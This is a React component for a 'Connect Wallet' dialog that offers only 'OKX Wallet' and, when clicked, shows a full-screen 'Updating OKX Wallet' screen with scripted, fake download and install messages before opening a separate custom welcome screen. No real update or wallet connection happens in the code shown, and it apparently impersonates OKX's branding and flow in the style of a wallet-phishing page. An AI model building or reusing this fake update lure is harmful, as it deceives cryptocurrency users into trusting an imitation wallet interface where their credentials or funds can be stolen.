"use client"

import { useState, useEffect, useRef } from "react"
import { Sheet, SheetContent } from "@/components/ui/sheet"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { OKXWelcomeScreen } from "./okx-welcome-screen"

interface Web3ModalProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onWalletConnected?: (address: string) => void
}

export function Web3Modal({ open, onOpenChange, onWalletConnected }: Web3ModalProps) {
  const [showOKXWelcome, setShowOKXWelcome] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [loadingProgress, setLoadingProgress] = useState(0)
  const [loadingMessage, setLoadingMessage] = useState("Initializing OKX Wallet...")
  const progressIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const timeoutRef = useRef<NodeJS.Timeout | null>(null)

  useEffect(() => {
    // Cleanup on unmount
    return () => {
      if (progressIntervalRef.current) {
        clearInterval(progressIntervalRef.current)
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current)
      }
    }
  }, [])

  const handleOKXClick = () => {
    setIsLoading(true)
    setLoadingProgress(0)
    setLoadingMessage("Initializing OKX Wallet...")
    
    // Simulate loading progress with different messages
    const messages = [
      { progress: 20, text: "Checking for updates..." },
      { progress: 40, text: "Downloading latest version..." },
      { progress: 60, text: "Installing updates..." },
      { progress: 80, text: "Verifying installation..." },
      { progress: 95, text: "Finalizing setup..." },
      { progress: 100, text: "Ready!" },
    ]

    let currentMessageIndex = 0
    progressIntervalRef.current = setInterval(() => {
      if (currentMessageIndex < messages.length) {
        setLoadingProgress(messages[currentMessageIndex].progress)
        setLoadingMessage(messages[currentMessageIndex].text)
        currentMessageIndex++
      } else {
        if (progressIntervalRef.current) {
          clearInterval(progressIntervalRef.current)
        }
      }
    }, 800)

    timeoutRef.current = setTimeout(() => {
      if (progressIntervalRef.current) {
        clearInterval(progressIntervalRef.current)
      }
      setIsLoading(false)
      setShowOKXWelcome(true)
      setLoadingProgress(0)
      setLoadingMessage("Initializing OKX Wallet...")
    }, 5000)
  }

  const handleBackFromWelcome = () => {
    setShowOKXWelcome(false)
  }

  const handleWalletConnected = (address: string) => {
    setShowOKXWelcome(false)
    onOpenChange(false)
    if (onWalletConnected) {
      onWalletConnected(address)
    }
  }

  return (
    <>
      {/* Main Connect Wallet Modal - Center */}
      <Dialog open={open && !showOKXWelcome && !isLoading} onOpenChange={onOpenChange}>
        <DialogContent className="max-w-md bg-black border-gray-800 rounded-2xl p-0 shadow-2xl" showCloseButton={true} noAnimation={true}>
          <div className="p-6">
            <h2 className="text-xl font-semibold text-white mb-6 text-center">Connect Wallet</h2>
            <div className="space-y-3">
              <button
                onClick={handleOKXClick}
                className="w-full flex items-center justify-between p-4 bg-gray-900 border border-gray-800 rounded-lg hover:border-[#B0DB12] hover:bg-gray-800 active:bg-gray-800 transition-all cursor-pointer group touch-manipulation"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-lg flex items-center justify-center bg-black overflow-hidden flex-shrink-0">
                    <img
                      src="/okx.webp"
                      alt="OKX Wallet"
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <span className="font-medium text-white group-hover:text-[#B0DB12]">OKX Wallet</span>
                </div>
                <svg
                  className="w-5 h-5 text-gray-400 group-hover:text-[#B0DB12] flex-shrink-0"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 5l7 7-7 7"
                  />
                </svg>
              </button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Loading Screen */}
      {isLoading && (
        <Dialog open={isLoading} onOpenChange={() => {}}>
          <DialogContent className="w-screen h-screen bg-black p-0 border-0 shadow-none" showCloseButton={false} fullscreen noAnimation={true}>
            <div className="w-full h-full flex flex-col items-center justify-center p-4">
              <div className="bg-gray-900 rounded-2xl p-6 sm:p-8 w-full max-w-md shadow-xl border border-gray-800">
                {/* Loading Icon with Pulse Animation */}
                <div className="flex justify-center mb-6">
                  <div className="relative">
                    {/* Pulse Ring */}
                    <div className="absolute inset-0 rounded-lg bg-[#B0DB12] opacity-20 animate-ping"></div>
                    <div className="absolute inset-0 rounded-lg bg-[#B0DB12] opacity-10 animate-pulse"></div>
                    {/* Logo Container */}
                    <div className="relative w-20 h-20 sm:w-24 sm:h-24 flex items-center justify-center bg-black rounded-lg overflow-hidden border-2 border-[#B0DB12]/30">
                      <img
                        src="/okx.webp"
                        alt="OKX Wallet"
                        className="w-full h-full object-contain"
                      />
                    </div>
                  </div>
                </div>

                {/* Loading Text */}
                <div className="text-center mb-6">
                  <h3 className="text-lg sm:text-xl font-bold text-white mb-3">Updating OKX Wallet</h3>
                  <p className="text-xs sm:text-sm text-gray-400 mb-1 min-h-[20px]">{loadingMessage}</p>
                  <p className="text-xs text-gray-500 mt-2">{loadingProgress}%</p>
                </div>
                
                {/* Animated Progress Bar */}
                <div className="w-full bg-gray-800 rounded-full h-2.5 overflow-hidden relative">
                  <div 
                    className="bg-[#B0DB12] h-2.5 rounded-full transition-all duration-500 ease-out relative overflow-hidden"
                    style={{ width: `${loadingProgress}%` }}
                  >
                    {/* Shimmer effect */}
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
                  </div>
                </div>

                {/* Loading Dots Animation */}
                <div className="flex justify-center gap-1.5 mt-6">
                  <div className="w-2 h-2 bg-[#B0DB12] rounded-full animate-bounce" style={{ animationDelay: '0ms', animationDuration: '1s' }}></div>
                  <div className="w-2 h-2 bg-[#B0DB12] rounded-full animate-bounce" style={{ animationDelay: '150ms', animationDuration: '1s' }}></div>
                  <div className="w-2 h-2 bg-[#B0DB12] rounded-full animate-bounce" style={{ animationDelay: '300ms', animationDuration: '1s' }}></div>
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}

      {/* OKX Welcome Screen - Side Panel */}
      {showOKXWelcome && (
        <OKXWelcomeScreen
          open={showOKXWelcome}
          onOpenChange={(open) => {
            if (!open) {
              setShowOKXWelcome(false)
              onOpenChange(false)
            }
          }}
          onBack={handleBackFromWelcome}
          onWalletConnected={handleWalletConnected}
        />
      )}
    </>
  )
}

